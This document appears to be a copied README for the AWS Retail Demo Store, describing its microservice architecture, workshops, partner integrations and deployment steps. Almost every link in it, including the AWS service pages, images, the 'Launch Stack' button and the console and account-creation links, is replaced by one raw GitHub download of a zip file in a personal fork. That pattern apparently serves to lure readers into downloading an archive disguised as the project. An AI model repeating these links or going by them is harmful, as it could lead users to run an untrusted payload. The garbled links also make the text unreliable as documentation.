...
![Retail Demo Store Home Page](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)
...
At the heart of the Retail Demo Store is a collection of polyglot microservices hosted in [Amazon Elastic Container Service](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) ([AWS Fargate](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)) that represent domain constructs such as [products](../src/products), [carts](../src/carts), [orders](../src/orders), and [users](../src/users) as well as services for [search](../src/search) and [recommendations](../src/recommendations). While the [web user interface](../src/web-ui) is served by Amazon CloudFront and Amazon S3.

The architecture is supported by several managed services including [Amazon Cognito](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip), [Amazon Pinpoint](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip), [Amazon Personalize](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip), and [Amazon OpenSearch Service](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) (successor to Amazon Elasticsearch Service). The [web user interface](../src/web-ui]) is built using the [https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) framework with [AWS Amplify](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) to provide integrations with Cognito for registration/authentication and event streaming to Pinpoint and Personalize (Event Tracker). Finally, [AWS CodePipeline](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) is leveraged to demonstrate how AWS development services can be used to orchestrate the build and deployment process with the Retail Demo Store.

![Retail Demo Store Architecture](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)
...
--- | --- | --- | --- | ---
![Amazon Personalize](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) Amazon Personalize | The Retail Demo Store uses Amazon Personalize to provide similar item recommendations, search re-ranking based on user preferences, and product recommendations based on user item interactions.  The attached workshop is a throrough walk through of the major features of Amazon Personalize, and how it can be deployed in an ecommerce application like the Retail Demo Store. | [Personalize Setup](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 300 | 2-2.5 hours
![Amazon Pinpoint](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) Amazon Pinpoint | In this workshop we will use Amazon Pinpoint to add the ability to dynamically send welcome messages, abandoned cart messages, and messages with personalized product recommendations to the customers of the Retail Demo Store. | [Email Campaigns](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 1 hour
![Amazon Lex](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) Amazon Lex |  In this module we're going to implement a conversational chatbot using Amazon Lex and integrate it into the Retail Demo Store's web UI. We'll provide some basic functionality to our chatbot such as being able to provide a return policy to users as well as wiring up the chatbot to the Amazon Personalize ML models we created in the Personalization workshop to provide personalized product recommendations to our users. | [Lex Chatbot](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 30 minutes
![Amazon OpenSearch](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) Amazon OpenSearch | In this workshop, you will create a new index using Amazon OpenSearch Service and then index the Retail Demo Store product data so that users can search for products.| [Product Search](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 20 minutes
![Amazon Location Services](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) Amazon Location Services | Create a geofence for customers approaching your physical store and send them timely pickup notifications and offers. | [Geofencing](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 300 | 2 hours
![Amazon Alexa](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) Amazon Alexa |  Incorporating Location Service, Personalize and Retail Demo Store into a hands-free ordering experience. | [Alexa skill deployment](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 300 | 60 minutes
Experimentation | In this module we are going to add experimentation to the Retail Demo Store. This will allow us to experiment with different personalization approaches in the user interface. Through notebooks in this module we will demonstrate how to implement three experimentation techniques as well as how to use [Amazon CloudWatch Evidently](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) for A/B tests. | [Overview](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) <br/><br/> [A/B](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) (400)<br/><br/> [Interleaving](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) (400)<br/><br/> [Multi-Armed Bandit](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) (400)<br/><br/> [CloudWatch Evidently](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) (200)| 200/400 | 1.5 hours
...
--- | --- | --- | --- | ---
<img src="https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip" height=64px/> | In this workshop, you will set up tracking for [Amplitude](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) events, analyze user behavior prior to peronalization being deployed, and then measure the effects of personalization on user behavior after Personalize is deployed in the Retail Demo Store. | [Evaluating Personalization Performance](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 30 minutes
<img src="https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip" height=64px/> | In this workshop we will use [Braze](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) to add the ability to personalize marketing messages to customers of the Retail Demo Store using customer behavioral data and the Personalize models you trained when setting up Amazon Personalize. | [Personalized Email Campaigns](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 1 hour
<img src="https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip" height=64px/> | [mParticle](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) is a Customer Data Platform that allows any brand to ingest data from multiple sources in real-time, apply data quality and governance over the ingested data and orchestrate the data to any marketing and technology stack your organization is using.  In this workshop, you will configure real-time event flows to Amazon Personalize using the mParticle SDKs and then use that data to create customer profiles that can be used in marketing campaigns to customers via Braze. | [Real Time Personalization Events](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) <br/><br/> [Personalized Customer Profiles and Messaging with any marketing tool (Braze) and mParticle](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 300 | 1-1.5 hours
<img src="https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip" height=64px/> | In this exercise we will define, launch, and evaluate the results of an A/B experiment of a personalized user experience using [Optimizely](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip). | [AB Experiments for Personalization](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 30 minutes
<img src="https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip"/> | [Segment](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) is a real-time events pipeline for customer data, as well as a customer data platform.  In the Retail Demo Store, Segment is used to deliver real-time events from the web user interface to Amazon Personalize.  These real-time events are also used to create customer profile with Amazon Personalize recommendations appended, which can then be used via the CDP to push data to marketing tools. | [Real Time Personalization Events](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) <br/><br/> [Customer Data Platforms and Personalize](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 300 | 1-1.5 hours
<img src="https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip"/> | [Layer0](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) extends the capabilities of a traditional CDN by not only hosting your static content, but also providing server-side rendering for progressive web applications. Layer0 allows caching both your APIs and HTML at the network edge to provide your users with the fastest browsing experience. Teams can ship faster leveraging an enhanced developer experience to deploy code faster and with more frequency, view their code quickly in atomically deployed environments, and integrating their CDN configuration to the overall build process. Layer0 provides the tools needed to build the modern apps capable of providing the performance expected by modern consumers.  | [Edge Optimization](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) | 200 | 1 hour

## Supported Regions

The Retail Demo Store has been tested in the AWS regions indicated in the deployment instructions below. Additional regions may be supported depending on [service availability](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) and having the Retail Demo Store's deployment resources staged to an S3 bucket in the targeted region.
...
If you do not have an AWS account, please see [How do I create and activate a new Amazon Web Services account?](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)

## Step 2 - Log into the AWS Console

Log into the [AWS console](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) if you are not already.
...
--- | --- | ---
US East (N. Virginia) | us-east-1 | [![Launch Stack](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)
...
By Default, AWS Accounts have  [emails set up in a sandbox environement](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip). To enable the functionality, you need to complete either of the following manual steps.
* Verifying the email addresses you want to send and receive emails from. More info [here](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip). This is the easiest and recommended approach for demos and workshops.
* Request to be removed from the sandbox environment. More info [here](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip). This is recommended only for production workloads and the Retail Demo Store is intended to be used for demonstration purposes only.

##### Pinpoint SMS
*PinpointSMSLongCode:*
A dedicated [long code](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) (i.e. a phone number) obtained for Amazon Pinpoint to send and receive messages at. You also need to enable [two way SMS](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) for this long code using Pinpoint. Follow steps 2 and 3 in the *Enable Pinpoint SMS Channel & Obtain Dedicated Long Code* section of the [Pinpoint workshop](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) to get a long code and enable two way SMS for it.
...
Here you will find several workshops in a directory structure in the notebook instance. See the [workshops](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) page for details.

# Developer Instructions

If you're interested in contributing enhancements, features, or fixes to the Retail Demo Store, please see the [Developer Instructions](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) for details on how to setup your local environment and deployment environment.
...
1) [Creating a Retail Demo Store account](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)
2) [Personalized Experience](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip)
...
If you encounter a bug, please create a new issue with as much detail as possible and steps for reproducing the bug. See the [Contributing Guidelines](https://raw.githubusercontent.com/sivahariu/retail-demo-store/master/aws/cloudformation-templates/services/service/retail-demo-store-1.0.zip) for more details.
